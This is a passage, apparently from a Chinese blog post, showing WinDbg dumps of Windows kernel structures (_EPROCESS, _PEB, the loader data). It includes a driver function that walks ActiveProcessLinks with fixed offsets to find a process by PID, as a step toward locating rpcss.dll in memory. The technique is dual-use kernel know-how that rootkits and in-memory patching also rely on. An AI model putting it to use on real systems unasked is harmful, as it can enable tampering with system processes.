_EPROCESS_QUOTA_BLOCK</div><div class="line">   +<span class="number">0</span>x0d8 <span class="attribute">CpuQuotaBlock    </span>: Ptr32 _PS_CPU_QUOTA_BLOCK</div><div class="line">   +<span class="number">0</span>x0dc <span class="attribute">PeakVirtualSize  </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x0e0 <span class="attribute">VirtualSize      </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x0e4 <span class="attribute">SessionProcessLinks </span>: _LIST_ENTRY</div><div class="line">   +<span class="number">0</span>x0ec <span class="attribute">DebugPort        </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x0f0 <span class="attribute">ExceptionPortData </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x0f0 <span class="attribute">ExceptionPortValue </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x0f0 <span class="attribute">ExceptionPortState </span>: Pos <span class="number">0</span>, <span class="number">3</span> Bits</div><div class="line">   +<span class="number">0</span>x0f4 <span class="attribute">ObjectTable      </span>: Ptr32 _HANDLE_TABLE</div><div class="line">   +<span class="number">0</span>x0f8 <span class="attribute">Token            </span>: _EX_FAST_REF</div><div class="line">   +<span class="number">0</span>x0fc <span class="attribute">WorkingSetPage   </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x100 <span class="attribute">AddressCreationLock </span>: _EX_PUSH_LOCK</div><div class="line">   +<span class="number">0</span>x104 <span class="attribute">RotateInProgress </span>: Ptr32 _ETHREAD</div><div class="line">   +<span class="number">0</span>x108 <span class="attribute">ForkInProgress   </span>: Ptr32 _ETHREAD</div><div class="line">   +<span class="number">0</span>x10c <span class="attribute">HardwareTrigger  </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x110 <span class="attribute">PhysicalVadRoot  </span>: Ptr32 _MM_AVL_TABLE</div><div class="line">   +<span class="number">0</span>x114 <span class="attribute">CloneRoot        </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x118 <span class="attribute">NumberOfPrivatePages </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x11c <span class="attribute">NumberOfLockedPages </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x120 <span class="attribute">Win32Process     </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x124 <span class="attribute">Job              </span>: Ptr32 _EJOB</div><div class="line">   +<span class="number">0</span>x128 <span class="attribute">SectionObject    </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x12c <span class="attribute">SectionBaseAddress </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x130 <span class="attribute">Cookie           </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x134 <span class="attribute">Spare8           </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x138 <span class="attribute">WorkingSetWatch  </span>: Ptr32 _PAGEFAULT_HISTORY</div><div class="line">   +<span class="number">0</span>x13c <span class="attribute">Win32WindowStation </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x140 <span class="attribute">InheritedFromUniqueProcessId </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x144 <span class="attribute">LdtInformation   </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x148 <span class="attribute">VdmObjects       </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x14c <span class="attribute">ConsoleHostProcess </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x150 <span class="attribute">DeviceMap        </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x154 <span class="attribute">EtwDataSource    </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x158 <span class="attribute">FreeTebHint      </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x160 <span class="attribute">PageDirectoryPte </span>: _HARDWARE_PTE_X86</div><div class="line">   +<span class="number">0</span>x160 <span class="attribute">Filler           </span>: Uint8B</div><div class="line">   +<span class="number">0</span>x168 <span class="attribute">Session          </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x16c <span class="attribute">ImageFileName    </span>: [<span class="number">15</span>] UChar</div><div class="line">   +<span class="number">0</span>x17b <span class="attribute">PriorityClass    </span>: UChar</div><div class="line">   +<span class="number">0</span>x17c <span class="attribute">JobLinks         </span>: _LIST_ENTRY</div><div class="line">   +<span class="number">0</span>x184 <span class="attribute">LockedPagesList  </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x188 <span class="attribute">ThreadListHead   </span>: _LIST_ENTRY</div><div class="line">   +<span class="number">0</span>x190 <span class="attribute">SecurityPort     </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x194 <span class="attribute">PaeTop           </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x198 <span class="attribute">ActiveThreads    </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x19c <span class="attribute">ImagePathHash    </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x1a0 <span class="attribute">DefaultHardErrorProcessing </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x1a4 <span class="attribute">LastThreadExitStatus </span>: Int4B</div><div class="line">   +<span class="number">0</span>x1a8 <span class="attribute">Peb              </span>: Ptr32 _PEB</div><div class="line">   +<span class="number">0</span>x1ac <span class="attribute">PrefetchTrace    </span>: _EX_FAST_REF</div><div class="line">   +<span class="number">0</span>x1b0 <span class="attribute">ReadOperationCount </span>: _LARGE_INTEGER</div><div class="line">   +<span class="number">0</span>x1b8 <span class="attribute">WriteOperationCount </span>: _LARGE_INTEGER</div><div class="line">   +<span class="number">0</span>x1c0 <span class="attribute">OtherOperationCount </span>: _LARGE_INTEGER</div><div class="line">   +<span class="number">0</span>x1c8 <span class="attribute">ReadTransferCount </span>: _LARGE_INTEGER</div><div class="line">   +<span class="number">0</span>x1d0 <span class="attribute">WriteTransferCount </span>: _LARGE_INTEGER</div><div class="line">   +<span class="number">0</span>x1d8 <span class="attribute">OtherTransferCount </span>: _LARGE_INTEGER</div><div class="line">   +<span class="number">0</span>x1e0 <span class="attribute">CommitChargeLimit </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x1e4 <span class="attribute">CommitChargePeak </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x1e8 <span class="attribute">AweInfo          </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x1ec <span class="attribute">SeAuditProcessCreationInfo </span>: _SE_AUDIT_PROCESS_CREATION_INFO</div><div class="line">   +<span class="number">0</span>x1f0 <span class="attribute">Vm               </span>: _MMSUPPORT</div><div class="line">   +<span class="number">0</span>x25c <span class="attribute">MmProcessLinks   </span>: _LIST_ENTRY</div><div class="line">   +<span class="number">0</span>x264 <span class="attribute">HighestUserAddress </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x268 <span class="attribute">ModifiedPageCount </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">Flags2           </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">JobNotReallyActive </span>: Pos <span class="number">0</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">AccountingFolded </span>: Pos <span class="number">1</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">NewProcessReported </span>: Pos <span class="number">2</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">ExitProcessReported </span>: Pos <span class="number">3</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">ReportCommitChanges </span>: Pos <span class="number">4</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">LastReportMemory </span>: Pos <span class="number">5</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">ReportPhysicalPageChanges </span>: Pos <span class="number">6</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">HandleTableRundown </span>: Pos <span class="number">7</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">NeedsHandleRundown </span>: Pos <span class="number">8</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">RefTraceEnabled  </span>: Pos <span class="number">9</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">NumaAware        </span>: Pos <span class="number">10</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">ProtectedProcess </span>: Pos <span class="number">11</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">DefaultPagePriority </span>: Pos <span class="number">12</span>, <span class="number">3</span> Bits</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">PrimaryTokenFrozen </span>: Pos <span class="number">15</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">ProcessVerifierTarget </span>: Pos <span class="number">16</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">StackRandomizationDisabled </span>: Pos <span class="number">17</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">AffinityPermanent </span>: Pos <span class="number">18</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">AffinityUpdateEnable </span>: Pos <span class="number">19</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">PropagateNode    </span>: Pos <span class="number">20</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">ExplicitAffinity </span>: Pos <span class="number">21</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">Spare1           </span>: Pos <span class="number">22</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">ForceRelocateImages </span>: Pos <span class="number">23</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">DisallowStrippedImages </span>: Pos <span class="number">24</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x26c <span class="attribute">LowVaAccessible  </span>: Pos <span class="number">25</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">Flags            </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">CreateReported   </span>: Pos <span class="number">0</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">NoDebugInherit   </span>: Pos <span class="number">1</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">ProcessExiting   </span>: Pos <span class="number">2</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">ProcessDelete    </span>: Pos <span class="number">3</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">Wow64SplitPages  </span>: Pos <span class="number">4</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">VmDeleted        </span>: Pos <span class="number">5</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">OutswapEnabled   </span>: Pos <span class="number">6</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">Outswapped       </span>: Pos <span class="number">7</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">ForkFailed       </span>: Pos <span class="number">8</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">Wow64VaSpace4Gb  </span>: Pos <span class="number">9</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">AddressSpaceInitialized </span>: Pos <span class="number">10</span>, <span class="number">2</span> Bits</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">SetTimerResolution </span>: Pos <span class="number">12</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">BreakOnTermination </span>: Pos <span class="number">13</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">DeprioritizeViews </span>: Pos <span class="number">14</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">WriteWatch       </span>: Pos <span class="number">15</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">ProcessInSession </span>: Pos <span class="number">16</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">OverrideAddressSpace </span>: Pos <span class="number">17</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">HasAddressSpace  </span>: Pos <span class="number">18</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">LaunchPrefetched </span>: Pos <span class="number">19</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">InjectInpageErrors </span>: Pos <span class="number">20</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">VmTopDown        </span>: Pos <span class="number">21</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">ImageNotifyDone  </span>: Pos <span class="number">22</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">PdeUpdateNeeded  </span>: Pos <span class="number">23</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">VdmAllowed       </span>: Pos <span class="number">24</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">CrossSessionCreate </span>: Pos <span class="number">25</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">ProcessInserted  </span>: Pos <span class="number">26</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">DefaultIoPriority </span>: Pos <span class="number">27</span>, <span class="number">3</span> Bits</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">ProcessSelfDelete </span>: Pos <span class="number">30</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x270 <span class="attribute">SetTimerResolutionLink </span>: Pos <span class="number">31</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0</span>x274 <span class="attribute">ExitStatus       </span>: Int4B</div><div class="line">   +<span class="number">0</span>x278 <span class="attribute">VadRoot          </span>: _MM_AVL_TABLE</div><div class="line">   +<span class="number">0</span>x298 <span class="attribute">AlpcContext      </span>: _ALPC_PROCESS_CONTEXT</div><div class="line">   +<span class="number">0</span>x2a8 <span class="attribute">TimerResolutionLink </span>: _LIST_ENTRY</div><div class="line">   +<span class="number">0</span>x2b0 <span class="attribute">RequestedTimerResolution </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x2b4 <span class="attribute">ActiveThreadsHighWatermark </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x2b8 <span class="attribute">SmallestTimerResolution </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x2bc <span class="attribute">TimerResolutionStackRecord </span>: Ptr32 _PO_DIAG_STACK_RECORD</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中重要的是位于+0xB8处的<code>ActiveProcessLinks</code>,这是一个_LIST_ENTRY结构，其指向的是下一个进程的_LIST_ENTRY结构，然后减去0xB8的偏移，即可获得下一个进程的EPROCESS。通过这个双向列表，可以遍历整个进程列表，然后是位于+0xB4的<code>UniqueProcessId</code>,这表示的是Pid。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先使用!process 获取当前进程的EPROCESS。当前的EPROCESS为0x869CF690。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1: kd&gt; !process</div><div class="line">PROCESS 869cf690  SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</div><div class="line">    DirBase: 00185000  ObjectTable: 8a401a70  HandleCount: 497.</div><div class="line">    Image: System</div><div class="line">    VadRoot 87c10c48 Vads 11 Clone 0 Private 3. Modified 8125. Locked 64.</div><div class="line">    DeviceMap 8a408840</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后使用<code>dt _EPROCESS 869cf690</code>获取ActiveProcessLinks，UniqueProcessId, ImageFileName等进程信息。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>: kd&gt; dt _EPROCESS <span class="number">869</span>cf690 </div><div class="line">ntdll!_EPROCESS</div><div class="line">   +<span class="number">0x000</span> <span class="string">Pcb              :</span> _KPROCESS</div><div class="line">   +<span class="number">0x098</span> <span class="string">ProcessLock      :</span> _EX_PUSH_LOCK</div><div class="line">   +<span class="number">0x0a0</span> <span class="string">CreateTime       :</span> _LARGE_INTEGER <span class="number">0x01d7d3a0</span>`<span class="number">340</span>bdebf</div><div class="line">   +<span class="number">0x0a8</span> <span class="string">ExitTime         :</span> _LARGE_INTEGER <span class="number">0x0</span></div><div class="line">   +<span class="number">0x0b0</span> <span class="string">RundownProtect   :</span> _EX_RUNDOWN_REF</div><div class="line">   +<span class="number">0x0b4</span> <span class="string">UniqueProcessId  :</span> <span class="number">0x00000004</span> Void</div><div class="line">   +<span class="number">0x0b8</span> <span class="string">ActiveProcessLinks :</span> _LIST_ENTRY [ <span class="number">0x87e14b28</span> - <span class="number">0x84183ba8</span> ]</div><div class="line">   +<span class="number">0x0c0</span> <span class="string">ProcessQuotaUsage :</span> [<span class="number">2</span>] <span class="number">0</span></div><div class="line">   +<span class="number">0x168</span> <span class="string">Session          :</span> (<span class="literal">null</span>) </div><div class="line">....</div><div class="line">   +<span class="number">0x16c</span> <span class="string">ImageFileName    :</span> [<span class="number">15</span>]  <span class="string">"System"</span></div><div class="line">   +<span class="number">0x17b</span> <span class="string">PriorityClass    :</span> <span class="number">0x2</span> <span class="string">''</span></div><div class="line">   +<span class="number">0x17c</span> <span class="string">JobLinks         :</span> _LIST_ENTRY [ <span class="number">0x0</span> - <span class="number">0x0</span> ]</div><div class="line">   +<span class="number">0x184</span> <span class="string">LockedPagesList  :</span> (<span class="literal">null</span>)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过ActiveProcessLinks遍历下一个进程的EPROCESS。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>: kd&gt; dt _EPROCESS  <span class="number">0x87e14b28</span><span class="number">-0xB8</span></div><div class="line">ntdll!_EPROCESS</div><div class="line">   +<span class="number">0x000</span> <span class="string">Pcb              :</span> _KPROCESS</div><div class="line">   +<span class="number">0x098</span> <span class="string">ProcessLock      :</span> _EX_PUSH_LOCK</div><div class="line">   +<span class="number">0x0a0</span> <span class="string">CreateTime       :</span> _LARGE_INTEGER <span class="number">0x01d7d3a0</span>`<span class="number">345</span>a6c28</div><div class="line">   +<span class="number">0x0a8</span> <span class="string">ExitTime         :</span> _LARGE_INTEGER <span class="number">0x0</span></div><div class="line">   +<span class="number">0x0b0</span> <span class="string">RundownProtect   :</span> _EX_RUNDOWN_REF</div><div class="line">   +<span class="number">0x0b4</span> <span class="string">UniqueProcessId  :</span> <span class="number">0x00000120</span> Void</div><div class="line">   +<span class="number">0x0b8</span> <span class="string">ActiveProcessLinks :</span> _LIST_ENTRY [ <span class="number">0x8847b780</span> - <span class="number">0x869cf748</span> ]</div><div class="line">   ......</div><div class="line">   +<span class="number">0x160</span> <span class="string">Filler           :</span> <span class="number">0</span></div><div class="line">   +<span class="number">0x168</span> <span class="string">Session          :</span> (<span class="literal">null</span>) </div><div class="line">   +<span class="number">0x16c</span> <span class="string">ImageFileName    :</span> [<span class="number">15</span>]  <span class="string">"smss.exe"</span></div><div class="line">   +<span class="number">0x17b</span> <span class="string">PriorityClass    :</span> <span class="number">0x2</span> <span class="string">''</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取指定进程的EPROCESS，则可以如此实现。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 原理:遍历EPROCESS列表</span></div><div class="line">PEPROCESS GetSpecialProcess(<span class="keyword">ULONG</span> dwPid)</div><div class="line">&#123;</div><div class="line"><span class="comment">//获取当前进程的EPROCESS</span></div><div class="line">PEPROCESS pResultEprocess = <span class="keyword">NULL</span>;</div><div class="line">PEPROCESS pCurrentProcess = <span class="keyword">NULL</span>;</div><div class="line">pCurrentProcess = PsGetCurrentProcess();</div><div class="line"><span class="keyword">if</span> (<span class="keyword">NULL</span> == pCurrentProcess)</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"[!] PsGetCurrentProcess"</span>);</div><div class="line"><span class="keyword">return</span> <span class="keyword">NULL</span>;</div><div class="line">&#125;</div><div class="line">PLIST_ENTRY pCurList = (PLIST_ENTRY)((<span class="keyword">ULONG</span>)pCurrentProcess + LIST_OFFSET);</div><div class="line">PLIST_ENTRY pList = pCurList;</div><div class="line">PEPROCESS pEprocess = <span class="keyword">NULL</span>;</div><div class="line"><span class="keyword">while</span> (pList-&gt;Flink != pCurList)</div><div class="line">&#123;</div><div class="line">pEprocess = (PEPROCESS)((<span class="keyword">ULONG</span>)pList - LIST_OFFSET);</div><div class="line"><span class="keyword">if</span> (pEprocess == <span class="keyword">NULL</span>)</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"pEprocess Error"</span>);</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">ULONG</span> ProcessId = <span class="number">-1</span>;</div><div class="line">ProcessId = *(<span class="keyword">ULONG</span>*)((<span class="keyword">ULONG</span>)pEprocess + PID_OFFSET);</div><div class="line"><span class="keyword">if</span> (ProcessId == <span class="number">-1</span>)</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"ProcessId Error"</span>);</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (ProcessId == dwPid)</div><div class="line">&#123;</div><div class="line">pResultEprocess = pEprocess;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">pList = pList-&gt;Flink;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> pResultEprocess;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着通过EPROCESS,就可以定位rpcss.dll模块。EPROCESS结构偏移为0x1A8保存着进程PEB，PEB又称进程环境块，通过PEB，获取PEB_LDR_DATA，继而通过PEB_LDR_DATA结构，可以遍历模块列表。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过EPROCESS获取PEB,继而可以获取_PEB_LDR_DATA。然后通过InLoadOrderModuleList遍历模块。关于通过PEB遍历模块列表，大家可以在各个论坛上了解这方面的知识点。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>: kd&gt; dt _PEB <span class="number">7</span>ffd4000</div><div class="line">ntdll!_PEB</div><div class="line">   +<span class="number">0x000</span> <span class="string">InheritedAddressSpace :</span> <span class="number">0</span> <span class="string">''</span></div><div class="line">   +<span class="number">0x001</span> <span class="string">ReadImageFileExecOptions :</span> <span class="number">0</span> <span class="string">''</span></div><div class="line">   +<span class="number">0x002</span> <span class="string">BeingDebugged    :</span> <span class="number">0</span> <span class="string">''</span></div><div class="line">   +<span class="number">0x003</span> <span class="string">BitField         :</span> <span class="number">0x8</span> <span class="string">''</span></div><div class="line">   +<span class="number">0x003</span> <span class="string">ImageUsesLargePages :</span> <span class="number">0</span>y0</div><div class="line">   +<span class="number">0x003</span> <span class="string">IsProtectedProcess :</span> <span class="number">0</span>y0</div><div class="line">   +<span class="number">0x003</span> <span class="string">IsLegacyProcess  :</span> <span class="number">0</span>y0</div><div class="line">   +<span class="number">0x003</span> <span class="string">IsImageDynamicallyRelocated :</span> <span class="number">0</span>y1</div><div class="line">   +<span class="number">0x003</span> <span class="string">SkipPatchingUser32Forwarders :</span> <span class="number">0</span>y0</div><div class="line">   +<span class="number">0x003</span> <span class="string">SpareBits        :</span> <span class="number">0</span>y000</div><div class="line">   +<span class="number">0x004</span> <span class="string">Mutant           :</span> <span class="number">0xffffffff</span> Void</div><div class="line">   +<span class="number">0x008</span> <span class="string">ImageBaseAddress :</span> <span class="number">0x00d90000</span> Void</div><div class="line">   +<span class="number">0x00c</span> <span class="string">Ldr              :</span> <span class="number">0x77437880</span> _PEB_LDR_DATA</div><div class="line">   +<span class="number">0x010</span> <span class="string">ProcessParameters :</span> <span class="number">0x003e1128</span> _RTL_USER_PROCESS_PARAMETERS</div><div class="line">   ....</div><div class="line"><span class="number">1</span>: kd&gt; dt _PEB_LDR_DATA <span class="number">0x77437880</span> </div><div class="line">ntdll!_PEB_LDR_DATA</div><div class="line">   +<span class="number">0x000</span> <span class="string">Length           :</span> <span class="number">0x30</span></div><div class="line">   +<span class="number">0x004</span> <span class="string">Initialized      :</span> <span class="number">0x1</span> <span class="string">''</span></div><div class="line">   +<span class="number">0x008</span> <span class="string">SsHandle         :</span> (<span class="literal">null</span>) </div><div class="line">   +<span class="number">0x00c</span> <span class="string">InLoadOrderModuleList :</span> _LIST_ENTRY [ <span class="number">0x3e1a00</span> - <span class="number">0x443248</span> ]</div><div class="line">   +<span class="number">0x014</span> <span class="string">InMemoryOrderModuleList :</span> _LIST_ENTRY [ <span class="number">0x3e1a08</span> - <span class="number">0x443250</span> ]</div><div class="line">   +<span class="number">0x01c</span> <span class="string">InInitializationOrderModuleList :</span> _LIST_ENTRY [ <span class="number">0x3e1a90</span> - <span class="number">0x443258</span> ]</div><div class="line">   +<span class="number">0x024</span> <span class="string">EntryInProgress  :</span> (<span class="literal">null</span>) </div><div class="line">   +<span class="number">0x028</span> <span class="string">ShutdownInProgress :</span> <span class="number">0</span> <span class="string">''</span></div><div class="line">   +<span class="number">0x02c</span> <span class="string">ShutdownThreadId :</span> (<span class="literal">null</span>) </div><div class="line">   ....</div><div class="line"><span class="number">1</span>: kd&gt; dt _LDR_DATA_TABLE_ENTRY <span class="number">0x3e1a00</span></div><div class="line">ntdll!_LDR_DATA_TABLE_ENTRY</div><div class="line">   +<span class="number">0x000</span> <span class="string">InLoadOrderLinks :</span> _LIST_ENTRY [ <span class="number">0x3e1a80</span> - <span class="number">0x7743788c</span> ]</div><div class="line">   +<span class="number">0x008</span> <span class="string">InMemoryOrderLinks :</span> _LIST_ENTRY [ <span class="number">0x3e1a88</span> - <span class="number">0x77437894</span> ]</div><div class="line">   +<span class="number">0x010</span> <span class="string">InInitializationOrderLinks :</span> _LIST_ENTRY [ <span class="number">0x0</span> - <span class="number">0x0</span> ]</div><div class="line">   +<span class="number">0x018</span> <span class="string">DllBase          :</span> <span class="number">0x00d90000</span> Void</div><div class="line">   +<span 